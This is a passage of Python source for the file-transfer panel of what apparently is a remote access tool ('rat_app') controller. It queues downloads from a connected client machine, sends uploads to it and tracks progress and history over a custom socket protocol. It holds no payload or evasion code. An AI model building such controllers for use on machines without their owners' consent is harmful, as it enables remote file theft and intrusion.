                               font=ctk.CTkFont(size=12),
                               padx=15, pady=10)
        toast_label.pack()
        
        # Position the toast
        toast.update_idletasks()  # Update to get correct dimensions
        toast_width = toast.winfo_width()
        toast_height = toast.winfo_height()
        
        toast_x = parent_x + parent_width - toast_width - 20
        toast_y = parent_y + parent_height - toast_height - 20
        
        toast.geometry(f"+{toast_x}+{toast_y}")
        
        # Auto-close after duration
        toast.after(duration, toast.destroy)
    
    def add_to_queue(self):
        """Add selected files to the transfer queue."""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
            
        # Get selected items
        selection = self.files_tree.selection()
        if not selection:
            messagebox.showinfo("No Selection", "Please select files to add to queue")
            return
            
        # Get destination directory
        dest_path = self.download_dest_entry.get()
        if not dest_path:
            dest_path = filedialog.askdirectory(title="Select Destination Folder")
            if not dest_path:
                return
            self.download_dest_entry.delete(0, tk.END)
            self.download_dest_entry.insert(0, dest_path)
        
        # Ensure queue storage exists
        if not hasattr(self, 'queue_items'):
            self.queue_items = []
            
        # Process each selected item
        current_path = self.remote_path_entry.get()
        
        # Ensure path ends with separator
        if not current_path.endswith('\\') and not current_path.endswith('/'):
            if '\\' in current_path:
                current_path += '\\'
            else:
                current_path += '/'
        
        # Get current priority setting
        priority = self.priority_var.get() if hasattr(self, 'priority_var') else "Normal"
        
        # Add each file to queue
        added_count = 0
        for item_id in selection:
            item = self.files_tree.item(item_id)
            values = item["values"]
            
            file_name = values[0]
            file_size = values[1] if len(values) > 1 else "0 B"
            file_type = values[2] if len(values) > 2 else ""
            
            # Skip folders for now (they could be handled with recursive download)
            if file_type.lower() == "folder":
                continue
                
            # Full path for file
            file_path = current_path + file_name
            
            # Add to queue
            queue_item = {
                'type': 'Download',
                'source': file_path,
                'destination': os.path.join(dest_path, file_name),
                'size': file_size,
                'priority': priority,
                'status': 'Pending',
                'added_time': time.time()
            }
            
            self.queue_items.append(queue_item)
            added_count += 1
        
        # Update queue display
        self.update_queue_display()
        
        # Show feedback
        if added_count > 0:
            self.rat_app.log(f"Added {added_count} files to queue")
            messagebox.showinfo("Queue Updated", f"Added {added_count} files to queue")
            
            # Switch to queue tab
            self.transfer_notebook.select(2)  # Index for queue tab
    
    def process_selected_queue(self):
        """Process selected items from the queue."""
        if not hasattr(self, 'queue_tree') or not hasattr(self, 'queue_items'):
            return
            
        selection = self.queue_tree.selection()
        if not selection:
            messagebox.showinfo("No Selection", "Please select queue items to process")
            return
            
        # Get selected indices (IDs are 1-based in the UI, 0-based in the list)
        selected_indices = []
        for item_id in selection:
            item = self.queue_tree.item(item_id)
            try:
                idx = int(item["values"][0]) - 1  # Convert to 0-based index
                if 0 <= idx < len(self.queue_items):
                    selected_indices.append(idx)
            except:
                continue
                
        if not selected_indices:
            return
            
        # Process each selected item
        for idx in sorted(selected_indices):
            queue_item = self.queue_items[idx]
            
            # Update status
            queue_item['status'] = 'Processing'
            self.update_queue_display()
            
            # Process based on type
            if queue_item['type'] == 'Download':
                self.process_download_item(queue_item)
            elif queue_item['type'] == 'Upload':
                self.process_upload_item(queue_item)
                
            # Remove from queue after processing
            try:
                self.queue_items.pop(idx)
            except:
                pass
                
        # Final update of queue display
        self.update_queue_display()
    
    def process_all_queue(self):
        """Process all items in the queue."""
        if not hasattr(self, 'queue_items') or not self.queue_items:
            messagebox.showinfo("Empty Queue", "No items in queue to process")
            return
            
        # Ask for confirmation
        count = len(self.queue_items)
        confirm = messagebox.askyesno("Confirm Process All", 
                                    f"Process all {count} items in the queue?")
        if not confirm:
            return
            
        # Sort queue by priority
        priority_order = {"High": 0, "Normal": 1, "Low": 2}
        sorted_queue = sorted(self.queue_items, 
                            key=lambda x: priority_order.get(x.get('priority', "Normal"), 1))
        
        # Process each item
        for queue_item in sorted_queue[:]:  # Work on a copy to avoid modification issues
            # Update status
            queue_item['status'] = 'Processing'
            self.update_queue_display()
            
            # Process based on type
            if queue_item['type'] == 'Download':
                self.process_download_item(queue_item)
            elif queue_item['type'] == 'Upload':
                self.process_upload_item(queue_item)
                
            # Remove from queue after processing
            try:
                self.queue_items.remove(queue_item)
            except:
                pass
                
            # Update display after each item
            self.update_queue_display()
    
    def process_download_item(self, queue_item):
        """Process a download item from the queue."""
        # Extract info from queue item
        remote_file = queue_item['source']
        local_dest = os.path.dirname(queue_item['destination'])
        
        try:
            # Update UI
            self.update_ui_for_transfer(True)
            self.stop_transfer = False
            self.status_value.configure(text=f"Downloading: {os.path.basename(remote_file)}")
            
            # Call download function
            self.download_file_thread(remote_file, local_dest)
            
            # Add to history
            self.add_to_history(queue_item, "Complete")
            
        except Exception as e:
            self.rat_app.log(f"Queue download error: {e}")
            self.add_to_history(queue_item, "Failed")
            
        finally:
            # Restore UI
            self.update_ui_for_transfer(False)
    
    def process_upload_item(self, queue_item):
        """Process an upload item from the queue."""
        # Extract info from queue item
        local_file = queue_item['source']
        remote_dest = os.path.dirname(queue_item['destination'])
        
        try:
            # Update UI
            self.update_ui_for_transfer(True)
            self.stop_transfer = False
            self.status_value.configure(text=f"Uploading: {os.path.basename(local_file)}")
            
            # Call upload function
            self.upload_file_thread(local_file, remote_dest)
            
            # Add to history
            self.add_to_history(queue_item, "Complete")
            
        except Exception as e:
            self.rat_app.log(f"Queue upload error: {e}")
            self.add_to_history(queue_item, "Failed")
            
        finally:
            # Restore UI
            self.update_ui_for_transfer(False)
    
    def clear_queue(self):
        """Clear all items from the queue."""
        if not hasattr(self, 'queue_items') or not self.queue_items:
            return
            
        # Ask for confirmation
        count = len(self.queue_items)
        confirm = messagebox.askyesno("Confirm Clear Queue", 
                                     f"Remove all {count} items from the queue?")
        if not confirm:
            return
            
        # Clear queue
        self.queue_items = []
        
        # Update display
        self.update_queue_display()
        
        # Show feedback
        self.rat_app.log("Queue cleared")
    
    def remove_from_queue(self):
        """Remove selected items from the queue."""
        if not hasattr(self, 'queue_tree') or not hasattr(self, 'queue_items'):
            return
            
        selection = self.queue_tree.selection()
        if not selection:
            return
            
        # Get selected indices (IDs are 1-based in the UI, 0-based in the list)
        selected_indices = []
        for item_id in selection:
            item = self.queue_tree.item(item_id)
            try:
                idx = int(item["values"][0]) - 1  # Convert to 0-based index
                if 0 <= idx < len(self.queue_items):
                    selected_indices.append(idx)
            except:
                continue
                
        if not selected_indices:
            return
            
        # Remove items in reverse order to avoid index shifting
        for idx in sorted(selected_indices, reverse=True):
            try:
                self.queue_items.pop(idx)
            except:
                pass
                
        # Update display
        self.update_queue_display()
    
    def move_queue_item(self, direction):
        """Move selected queue item up or down in the queue."""
        if not hasattr(self, 'queue_tree') or not hasattr(self, 'queue_items'):
            return
            
        selection = self.queue_tree.selection()
        if not selection or len(selection) != 1:
            return  # Only move one item at a time
            
        # Get selected index
        item = self.queue_tree.item(selection[0])
        try:
            idx = int(item["values"][0]) - 1  # Convert to 0-based index
            if not (0 <= idx < len(self.queue_items)):
                return
        except:
            return
            
        # Move item
        if direction == "up" and idx > 0:
            # Swap with previous item
            self.queue_items[idx], self.queue_items[idx-1] = self.queue_items[idx-1], self.queue_items[idx]
            new_idx = idx - 1
        elif direction == "down" and idx < len(self.queue_items) - 1:
            # Swap with next item
            self.queue_items[idx], self.queue_items[idx+1] = self.queue_items[idx+1], self.queue_items[idx]
            new_idx = idx + 1
        else:
            return  # Can't move further
            
        # Update display
        self.update_queue_display()
        
        # Reselect the moved item
        try:
            self.queue_tree.selection_set(self.queue_tree.get_children()[new_idx])
        except:
            pass
    
    def change_queue_priority(self):
        """Change priority of selected queue items."""
        if not hasattr(self, 'queue_tree') or not hasattr(self, 'queue_items'):
            return
            
        selection = self.queue_tree.selection()
        if not selection:
            return
            
        # Get selected indices
        selected_indices = []
        for item_id in selection:
            item = self.queue_tree.item(item_id)
            try:
                idx = int(item["values"][0]) - 1  # Convert to 0-based index
                if 0 <= idx < len(self.queue_items):
                    selected_indices.append(idx)
            except:
                continue
                
        if not selected_indices:
            return
            
        # Ask for new priority
        theme = self.get_theme_colors()
        priority_dialog = ctk.CTkToplevel(self.file_frame)
        priority_dialog.title("Change Priority")
        priority_dialog.geometry("300x150")
        priority_dialog.grab_set()
        
        # Create dialog content
        dialog_frame = ctk.CTkFrame(priority_dialog)
        dialog_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        dialog_label = ctk.CTkLabel(dialog_frame, text="Select new priority:")
        dialog_label.pack(pady=10)
        
        # Priority options
        priority_var = tk.StringVar(value="Normal")
        
        radio_frame = ctk.CTkFrame(dialog_frame, fg_color="transparent")
        radio_frame.pack(pady=10)
        
        high_radio = ctk.CTkRadioButton(radio_frame, text="High", variable=priority_var, 
                                     value="High", fg_color=theme["accent_color"])
        high_radio.pack(side=tk.LEFT, padx=10)
        
        normal_radio = ctk.CTkRadioButton(radio_frame, text="Normal", variable=priority_var, 
                                       value="Normal", fg_color=theme["accent_color"])
        normal_radio.pack(side=tk.LEFT, padx=10)
        
        low_radio = ctk.CTkRadioButton(radio_frame, text="Low", variable=priority_var, 
                                    value="Low", fg_color=theme["accent_color"])
        low_radio.pack(side=tk.LEFT, padx=10)
        
        # Button functions
        def apply_priority():
            new_priority = priority_var.get()
            for idx in selected_indices:
                self.queue_items[idx]['priority'] = new_priority
            self.update_queue_display()
            priority_dialog.destroy()
            
        def cancel():
            priority_dialog.destroy()
        
        # Buttons
        button_frame = ctk.CTkFrame(dialog_frame, fg_color="transparent")
        button_frame.pack(pady=10)
        
        apply_btn = ctk.CTkButton(button_frame, text="Apply", command=apply_priority,
                              fg_color=theme["accent_color"], hover_color=theme["hover_color"])
        apply_btn.pack(side=tk.LEFT, padx=10)
        
        cancel_btn = ctk.CTkButton(button_frame, text="Cancel", command=cancel,
                               fg_color=theme["button_color"], hover_color=theme["hover_color"])
        cancel_btn.pack(side=tk.LEFT, padx=10)
    
    def add_to_history(self, item, status):
        """Add a completed transfer to the history."""
        if not hasattr(self, 'history_items'):
            self.history_items = []
            
        # Create history entry
        now = datetime.now()
        
        history_item = {
            'date': now.strftime("%Y-%m-%d"),
            'time': now.strftime("%H:%M:%S"),
            'type': item.get('type', 'Unknown'),
            'file': os.path.basename(item.get('source', '')),
            'size': item.get('size', '0 B'),
            'destination': item.get('destination', ''),
            'status': status,
            'duration': item.get('duration', '0s')
        }
        
        # Add to history
        self.history_items.append(history_item)
        
        # Update total transfers count
        if hasattr(self, 'total_transfers_label'):
            count = len(self.history_items)
            self.total_transfers_label.configure(text=f"Total Transfers: {count}")
        
        # Save history
        self.save_history()
    
    def clear_history(self):
        """Clear the transfer history."""
        if not hasattr(self, 'history_items') or not self.history_items:
            return
            
        # Ask for confirmation
        count = len(self.history_items)
        confirm = messagebox.askyesno("Confirm Clear History", 
                                     f"Remove all {count} items from history?")
        if not confirm:
            return
            
        # Clear history
        self.history_items = []
        
        # Update display
        self.update_history_display()
        
        # Reset total transfers count
        if hasattr(self, 'total_transfers_label'):
            self.total_transfers_label.configure(text="Total Transfers: 0")
        
        # Save empty history
        self.save_history()
        
        # Show feedback
        self.rat_app.log("History cleared")
    
    def export_history(self):
        """Export the transfer history to a CSV file."""
        if not hasattr(self, 'history_items') or not self.history_items:
            messagebox.showinfo("Empty History", "No history items to export")
            return
            
        # Ask for save location
        file_path = filedialog.asksaveasfilename(
            defaultextension=".csv",
            filetypes=[("CSV files", "*.csv"), ("All files", "*.*")],
            title="Save History As"
        )
        
        if not file_path:
            return
            
        try:
            # Write CSV
            with open(file_path, 'w', newline='') as csvfile:
                fieldnames = ['date', 'time', 'type', 'file', 'size', 'destination', 'status', 'duration']
                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                
                writer.writeheader()
                for item in self.history_items:
                    writer.writerow(item)
                    
            # Show success
            self.rat_app.log(f"History exported to {file_path}")
            messagebox.showinfo("Export Complete", f"History exported to {file_path}")
            
        except Exception as e:
            self.rat_app.log(f"Error exporting history: {e}")
            messagebox.showerror("Export Error", f"Error exporting history: {e}")
    
    def filter_history(self, event=None):
        """Apply filters to history display."""
        self.update_history_display()
    
    def save_history(self):
        """Save history to a file."""
        if not hasattr(self, 'history_items'):
            return
            
        try:
            with open("transfer_history.json", "w") as f:
                json.dump(self.history_items, f)
        except Exception as e:
            self.rat_app.log(f"Error saving history: {e}")
    
    def load_history(self):
        """Load history from a file."""
        try:
            if os.path.exists("transfer_history.json"):
                with open("transfer_history.json", "r") as f:
                    self.history_items = json.load(f)
                    
                    # Update total transfers count
                    if hasattr(self, 'total_transfers_label'):
                        count = len(self.history_items)
                        self.total_transfers_label.configure(text=f"Total Transfers: {count}")
        except Exception as e:
            self.rat_app.log(f"Error loading history: {e}")
            self.history_items = []
    
    
    def toggle_pause_resume(self):
        """Toggle between pause and resume for current transfer."""
        if not hasattr(self, 'is_paused'):
            self.is_paused = False
            
        self.is_paused = not self.is_paused
        
        if self.is_paused:
            # Pause transfer
            self.pause_btn.configure(text="Resume")
            self.status_value.configure(text="Paused")
        else:
            # Resume transfer
            self.pause_btn.configure(text="Pause")
            self.status_value.configure(text="Transferring")

    
    #--------------------------------------------------------
    # Core File Transfer Methods
    #--------------------------------------------------------
    
    def browse_upload_file(self):
        """Browse for a file to upload with enhanced functionality."""
        if self.multiple_files_var.get():
            file_paths = filedialog.askopenfilenames(title="Select Files to Upload")
            if not file_paths:
                return
                
            # Show count in the text field
            self.upload_file_entry.delete(0, tk.END)
            self.upload_file_entry.insert(0, f"{len(file_paths)} files selected")
            
            # Store the list for later use
            self.selected_files = list(file_paths)
            
            # Update file info with multi-file summary
            self.update_multifile_info(file_paths)
        else:
            file_path = filedialog.askopenfilename(title="Select File to Upload")
            if not file_path:
                return
                
            self.upload_file_entry.delete(0, tk.END)
            self.upload_file_entry.insert(0, file_path)
            
            # Store single file path
            self.selected_files = [file_path]
            
            # Update file info
            self.update_file_info(file_path)
    
    def browse_download_dest(self):
        """Browse for a download destination folder."""
        folder_path = filedialog.askdirectory(title="Select Destination Folder")
        if folder_path:
            self.download_dest_entry.delete(0, tk.END)
            self.download_dest_entry.insert(0, folder_path)
    
    def update_file_info(self, file_path):
        """Update file info display with enhanced details."""
        try:
            file_stats = os.stat(file_path)
            file_size = file_stats.st_size
            last_modified = time.ctime(file_stats.st_mtime)
            created_time = time.ctime(file_stats.st_ctime)
            
            file_name = os.path.basename(file_path)
            file_ext = os.path.splitext(file_name)[1]
            
            # Get file type description
            file_type = self.get_file_type_description(file_ext)
            
            # Calculate MD5 hash for small files (optional)
            md5_hash = ""
            if file_size < 50 * 1024 * 1024:  # Only for files smaller than 50 MB
                try:
                    with open(file_path, 'rb') as f:
                        md5_hash = hashlib.md5(f.read()).hexdigest()
                except:
                    md5_hash = "Unable to calculate"
            else:
                md5_hash = "File too large"
            
            self.upload_info_text.configure(state="normal")
            self.upload_info_text.delete(1.0, tk.END)
            self.upload_info_text.insert(tk.END, f"File Name: {file_name}\n")
            self.upload_info_text.insert(tk.END, f"Size: {self.format_size(file_size)}\n")
            self.upload_info_text.insert(tk.END, f"Type: {file_type}\n")
            self.upload_info_text.insert(tk.END, f"Created: {created_time}\n")
            self.upload_info_text.insert(tk.END, f"Last Modified: {last_modified}\n")
            self.upload_info_text.insert(tk.END, f"Location: {os.path.dirname(file_path)}\n")
            self.upload_info_text.insert(tk.END, f"MD5 Hash: {md5_hash}\n")
            
            # Estimated transfer time (based on average speed)
            avg_speed = 1024 * 1024  # 1 MB/s as default
            est_time = file_size / avg_speed if avg_speed > 0 else 0
            est_time_str = self.format_time(est_time)
            self.upload_info_text.insert(tk.END, f"Est. Transfer Time: {est_time_str}\n")
            
            self.upload_info_text.configure(state="disabled")
            
        except Exception as e:
            self.upload_info_text.configure(state="normal")
            self.upload_info_text.delete(1.0, tk.END)
            self.upload_info_text.insert(tk.END, f"Error getting file info: {e}")
            self.upload_info_text.configure(state="disabled")
    
    def update_multifile_info(self, file_paths):
        """Update file info display with summary of multiple files."""
        try:
            # Calculate total stats
            total_size = 0
            file_types = {}
            newest_mod_time = 0
            
            for path in file_paths:
                try:
                    file_stats = os.stat(path)
                    total_size += file_stats.st_size
                    
                    # Track file types
                    file_ext = os.path.splitext(path)[1].lower()
                    if file_ext in file_types:
                        file_types[file_ext] += 1
                    else:
                        file_types[file_ext] = 1
                        
                    # Track newest modified time
                    if file_stats.st_mtime > newest_mod_time:
                        newest_mod_time = file_stats.st_mtime
                except:
                    continue
            
            # Format file type summary
            type_summary = ", ".join([f"{count} {ext}" for ext, count in file_types.items()])
            
            self.upload_info_text.configure(state="normal")
            self.upload_info_text.delete(1.0, tk.END)
            self.upload_info_text.insert(tk.END, f"Files Selected: {len(file_paths)}\n")
            self.upload_info_text.insert(tk.END, f"Total Size: {self.format_size(total_size)}\n")
            self.upload_info_text.insert(tk.END, f"File Types: {type_summary}\n")
            self.upload_info_text.insert(tk.END, f"Most Recent Modified: {time.ctime(newest_mod_time)}\n")
            
            # Estimate transfer time
            avg_speed = 1024 * 1024  # 1 MB/s as default
            est_time = total_size / avg_speed if avg_speed > 0 else 0
            est_time_str = self.format_time(est_time)
            self.upload_info_text.insert(tk.END, f"Est. Transfer Time: {est_time_str}\n")
            
            self.upload_info_text.configure(state="disabled")
            
        except Exception as e:
            self.upload_info_text.configure(state="normal")
            self.upload_info_text.delete(1.0, tk.END)
            self.upload_info_text.insert(tk.END, f"Error getting files info: {e}")
            self.upload_info_text.configure(state="disabled")
    
    def get_file_type_description(self, extension):
        """Get a human-readable description of a file type."""
        extension = extension.lower()
        file_types = {
            ".txt": "Text Document",
            ".pdf": "PDF Document",
            ".doc": "Word Document",
            ".docx": "Word Document",
            ".xls": "Excel Spreadsheet",
            ".xlsx": "Excel Spreadsheet",
            ".ppt": "PowerPoint Presentation",
            ".pptx": "PowerPoint Presentation",
            ".jpg": "JPEG Image",
            ".jpeg": "JPEG Image",
            ".png": "PNG Image",
            ".gif": "GIF Image",
            ".mp3": "MP3 Audio",
            ".mp4": "MP4 Video",
            ".zip": "ZIP Archive",
            ".rar": "RAR Archive",
            ".exe": "Executable",
            ".dll": "Dynamic Link Library",
            ".py": "Python Script",
            ".js": "JavaScript File",
            ".html": "HTML Document",
            ".css": "CSS Stylesheet",
            ".json": "JSON File",
            ".xml": "XML File",
            ".csv": "CSV Spreadsheet",
            ".md": "Markdown Document"
        }
        
        return file_types.get(extension, f"{extension} File" if extension else "Unknown")
    
    def format_size(self, size_bytes):
        """Convert byte size to human readable format with improved precision."""
        if size_bytes < 0:
            return "0 B"
            
        units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB']
        i = 0
        while size_bytes >= 1024 and i < len(units) - 1:
            size_bytes /= 1024.0
            i += 1
            
        # Use more appropriate precision based on unit
        if i == 0:  # Bytes
            return f"{int(size_bytes)} {units[i]}"
        elif i == 1:  # KB
            return f"{size_bytes:.1f} {units[i]}"
        else:  # MB and above
            return f"{size_bytes:.2f} {units[i]}"
    
    def format_time(self, seconds):
        """Format time in seconds to a human-readable string."""
        if seconds < 1:
            return "less than a second"
            
        units = [
            (60 * 60 * 24, "day"),
            (60 * 60, "hour"),
            (60, "minute"),
            (1, "second")
        ]
        
        parts = []
        for unit_value, unit_name in units:
            if seconds >= unit_value:
                count = int(seconds / unit_value)
                seconds %= unit_value
                parts.append(f"{count} {unit_name}{'s' if count > 1 else ''}")
                
                # Stop after 2 units
                if len(parts) >= 2:
                    break
        
        return " ".join(parts)
    
    def update_ui_for_transfer(self, is_transferring=True):
        """Update UI elements based on transfer state with enhanced controls."""
        if is_transferring:
            # Disable controls during transfer
            self.upload_btn.configure(state="disabled")
            self.download_btn.configure(state="disabled")
            
            # Enable controls for active transfer
            self.cancel_btn.configure(state="normal")
            self.pause_btn.configure(state="normal") 
            self.resume_btn.configure(state="disabled")
            
            # Reset progress indicators
            self.progress_bar.set(0)
            self.progress_text.configure(text="0%")
            self.progress_details.configure(text="0 B / 0 B")
            self.speed_label.configure(text="0 B/s")
            self.eta_label.configure(text="--:--")
            
            # Show transfer in progress in connection status
            self.connection_status.configure(text="●", text_color="#00AA00")
        else:
            # Enable main controls
            self.upload_btn.configure(state="normal")
            self.download_btn.configure(state="normal")
            
            # Disable transfer controls
            self.cancel_btn.configure(state="disabled")
            self.pause_btn.configure(state="disabled")
            
            # Reset progress indicators
            self.progress_bar.set(0)
            self.progress_text.configure(text="0%")
            self.progress_details.configure(text="0 B / 0 B")
            self.speed_label.configure(text="0 B/s")
            self.eta_label.configure(text="--:--")
            self.status_value.configure(text="Idle")
            
            # Enable resume button if we have any saved transfer states
            if hasattr(self, 'transfer_states') and self.transfer_states:
                self.resume_btn.configure(state="normal")
            else:
                self.resume_btn.configure(state="disabled")
                
            # Update connection status
            if self.rat_app.current_client_socket:
                self.connection_status.configure(text="●", text_color="#00AA00")
            else:
                self.connection_status.configure(text="●", text_color="#FF5555")
    
    def cancel_transfer(self):
        """Cancel the current transfer with enhanced feedback."""
        self.stop_transfer = True
        self.status_value.configure(text="Cancelling...")
        
        # Record cancellation in history if transfer is active
        if hasattr(self, 'current_transfer') and self.current_transfer:
            self.add_to_history(self.current_transfer, "Cancelled")
    
    def update_progress(self, current, total, start_time):
        """Update all progress indicators with consistent metrics."""
        if total <= 0:
            return
            
        # Calculate progress percentage
        progress = current / total
        self.progress_bar.set(progress)
        
        # Update percentage text
        percentage = int(progress * 100)
        self.progress_text.configure(text=f"{percentage}%")
        
        # Update size details
        self.progress_details.configure(text=f"{self.format_size(current)} / {self.format_size(total)}")
        
        # Calculate and update speed
        elapsed_time = time.time() - start_time
        if elapsed_time > 0:
            speed = current / elapsed_time
            self.speed_label.configure(text=f"{self.format_size(speed)}/s")
            
            # Calculate and update ETA
            if speed > 0:
                remaining_bytes = total - current
                eta_seconds = remaining_bytes / speed
                
                # Format ETA
                if eta_seconds < 60:
                    eta_str = f"{int(eta_seconds)}s"
                elif eta_seconds < 3600:
                    minutes = int(eta_seconds / 60)
                    seconds = int(eta_seconds % 60)
                    eta_str = f"{minutes}m {seconds}s"
                else:
                    hours = int(eta_seconds / 3600)
                    minutes = int((eta_seconds % 3600) / 60)
                    eta_str = f"{hours}h {minutes}m"
                    
                self.eta_label.configure(text=eta_str)
    
    # File upload functionality with improved error handling and reporting
    def upload_file(self):
        """Start a file upload with enhanced multi-file support."""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "No client connected")
            return
        
        # Check if we're in single or multi-file mode
        if not hasattr(self, 'selected_files') or not self.selected_files:
            messagebox.showinfo("No Files", "No files selected for upload")
            return
            
        dest_path = self.upload_dest_entry.get()
        if not dest_path:
            messagebox.showinfo("Missing Destination", "Please specify a destination path")
            return
        
        # Update client info label
        for addr, (client_id, conn) in self.rat_app.clients.items():
            if conn == self.rat_app.current_client_socket:
                self.client_info_label.configure(text=f"{addr[0]}:{addr[1]}")
                break
        
        # Check if we should queue or start directly
        if self.queue_var.get():
            self.add_to_upload_queue(self.selected_files, dest_path)
        else:
            # If multiple files, start first file and queue the rest
            if len(self.selected_files) > 1:
                first_file = self.selected_files[0]
                self.selected_files = self.selected_files[1:]
                
                # Queue remaining files
                if self.selected_files:
                    self.add_to_upload_queue(self.selected_files, dest_path)
                    
                # Start upload of first file
                self.update_ui_for_transfer(True)
                self.stop_transfer = False
                threading.Thread(target=self.upload_file_thread, args=(first_file, dest_path), daemon=True).start()
            else:
                # Single file upload
                self.update_ui_for_transfer(True)
                self.stop_transfer = False
                threading.Thread(target=self.upload_file_thread, args=(self.selected_files[0], dest_path), daemon=True).start()
    
    def add_to_upload_queue(self, file_paths, dest_path):
        """Add files to the upload queue."""
        if not hasattr(self, 'queue_items'):
            self.queue_items = []
            
        # Get current priority setting
        priority = self.priority_var.get() if hasattr(self, 'priority_var') else "Normal"
        
        # Add each file to queue
        for file_path in file_paths:
            try:
                file_name = os.path.basename(file_path)
                file_size = os.path.getsize(file_path)
                
                # Full destination path
                full_dest_path = os.path.join(dest_path, file_name)
                
                # Add to queue
                queue_item = {
                    'type': 'Upload',
                    'source': file_path,
                    'destination': full_dest_path,
                    'size': self.format_size(file_size),
                    'priority': priority,
                    'status': 'Pending',
                    'added_time': time.time()
                }
                
                self.queue_items.append(queue_item)
            except Exception as e:
                self.rat_app.log(f"Error adding to upload queue: {e}")
        
        # Update queue display
        self.update_queue_display()
        
        # Show feedback
        count = len(file_paths)
        self.rat_app.log(f"Added {count} files to upload queue")
        
        # Show a notification
        self.show_toast_notification(f"Added {count} files to upload queue")
    
    def upload_file_thread(self, file_path, dest_path):
        """Upload a file with improved progress tracking and error handling."""
        
        if not hasattr(self, 'is_paused'):
            self.is_paused = False
        try:
            # First, validate that the file still exists
            if not os.path.exists(file_path):
                self.rat_app.log(f"Error: Source file no longer exists: {file_path}")
                self.file_frame.after(0, lambda: self.status_value.configure(text="Error: Source file missing"))
                self.file_frame.after(0, lambda: self.update_ui_for_transfer(False))
                return
                
            # Record start time for performance metrics
            start_time = time.time()
                
            file_size = os.path.getsize(file_path)
            file_name = os.path.basename(file_path)
            
            # Generate a unique transfer ID
            transfer_id = f"UP_{file_name}_{int(start_time)}"
            
            # Create current transfer record
            self.current_transfer = {
                'type': 'Upload',
                'source': file_path,
                'destination': os.path.join(dest_path, file_name),
                'size': self.format_size(file_size),
                'status': 'In Progress',
                'start_time': start_time
            }
            
            # Ensure destination ends with a separator
            if not dest_path.endswith('\\') and not dest_path.endswith('/'):
                dest_path += '\\'
            
            full_dest_path = dest_path + file_name
            
            # Check if we have an existing transfer state
            resume_position = 0
            if transfer_id in self.transfer_states:
                resume_position = self.transfer_states[transfer_id]['position']
                self.rat_app.log(f"Resuming upload from position {resume_position}/{file_size}")
            
            # Update UI to show file being uploaded
            self.file_frame.after(0, lambda: self.status_value.configure(text=f"Uploading: {file_name}"))
            
            # Determine if we should overwrite
            overwrite = self.overwrite_var.get() if hasattr(self, 'overwrite_var') else True
            
            # Clear any stale data in the socket buffer before starting command
            try:
                self.rat_app.current_client_socket.settimeout(0.1)
                while True:
                    stale_data = self.rat_app.current_client_socket.recv(1024)
                    if not stale_data:
                        break
            except (socket.timeout, BlockingIOError):
                pass  # No data to read, which is expected
            finally:
                self.rat_app.current_client_socket.settimeout(None)
            
            # Send command to start/resume file transfer with verbose logging
            command = f"FILE_UPLOAD|{full_dest_path}|{file_size}|{resume_position}|{transfer_id}|{overwrite}"
            self.rat_app.log(f"Sending command: {command}")
            self.rat_app.current_client_socket.send(command.encode())
            
            # Wait for acknowledgment with timeout
            self.rat_app.current_client_socket.settimeout(15)  # Increased timeout to 15 seconds
            try:
                response = self.rat_app.current_client_socket.recv(1024).decode()
                self.rat_app.log(f"Received response: {response}")
                
                if "READY" not in response:  # Accept READY as substring
                    self.rat_app.log(f"Upload failed: {response}")
                    self.file_frame.after(0, lambda: self.status_value.configure(text=f"Error: {response}"))
                    self.file_frame.after(0, lambda: self.update_ui_for_transfer(False))
                    return
            except socket.timeout:
                self.rat_app.log("Timeout waiting for READY response")
                self.file_frame.after(0, lambda: self.status_value.configure(text="Error: Connection timeout"))
                self.file_frame.after(0, lambda: self.update_ui_for_transfer(False))
                return
            finally:
                self.rat_app.current_client_socket.settimeout(None)  # Remove timeout
            
            # Send file data from the resume position
            with open(file_path, 'rb') as f:
                try:
                    f.seek(resume_position)
                    self.rat_app.log(f"Seeking to position {resume_position} in file")
                except Exception as e:
                    self.rat_app.log(f"Error seeking to position {resume_position}: {e}")
                    self.file_frame.after(0, lambda: self.status_value.configure(text="Error: Cannot resume from position"))
                    self.file_frame.after(0, lambda: self.update_ui_for_transfer(False))
                    return
                    
                bytes_sent = resume_position
                
                # Update transfer state
                self.transfer_states[transfer_id] = {
                    'type': 'upload',
                    'file_path': file_path,
                    'dest_path': full_dest_path,
                    'total_size': file_size,
                    'position': bytes_sent,
                    'start_time': start_time
                }
                
                # Save state immediately after updating
                self.save_transfer_states()
                
                # Use a more reliable chunking approach
                chunk_size = self.CHUNK_SIZE
                last_save_time = time.time()
                last_update_time = time.time()
                
                while bytes_sent < file_size and not self.stop_transfer and not self.is_paused:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                    
                    try:
                        self.rat_app.current_client_socket.send(chunk)
                        bytes_sent += len(chunk)
                        
                        # Update progress (limit updates to avoid UI freezing)
                        current_time = time.time()
                        if current_time - last_update_time > 0.1:  # Update every 100ms
                            self.file_frame.after(0, lambda b=bytes_sent, t=file_size, s=start_time: 
                                            self.update_progress(b, t, s))
                            last_update_time = current_time
                        
                        # Update transfer state (periodically to avoid excessive writes)
                        if current_time - last_save_time > 2:  # Save every 2 seconds
                            self.transfer_states[transfer_id]['position'] = bytes_sent
                            self.save_transfer_states()
                            last_save_time = current_time
                        
                        # Handle pause
                        while self.is_paused and not self.stop_transfer:
                            if hasattr(self, 'is_paused') and self.is_paused:
                                time.sleep(0.5)  # Sleep briefly while paused
                                continue  # Skip to next iteration
                        
                        # Wait for acknowledgment to ensure flow control - Modified to accept "ACK" as substring
                        self.rat_app.current_client_socket.settimeout(15)  # Increased timeout to 15 seconds
                        try:
                            ack = self.rat_app.current_client_socket.recv(1024).decode()
                            self.rat_app.log(f"Received ACK response: {ack}")  # Debug logging
                            
                            if "ACK" not in ack:  # Changed from exact match to containment check
                                self.rat_app.log(f"Unexpected acknowledgment: {ack}")
                                raise Exception("Transfer interrupted")
                        except socket.timeout:
                            self.rat_app.log("Timeout waiting for ACK")
                            raise Exception("Connection timeout")
                        finally:
                            self.rat_app.current_client_socket.settimeout(None)
                            
                    except Exception as e:
                        self.rat_app.log(f"Error sending chunk: {e}")
                        # Update state before propagating the exception
                        self.transfer_states[transfer_id]['position'] = bytes_sent
                        self.save_transfer_states()
                        raise
            
            # Final update to transfer state
            self.transfer_states[transfer_id]['position'] = bytes_sent
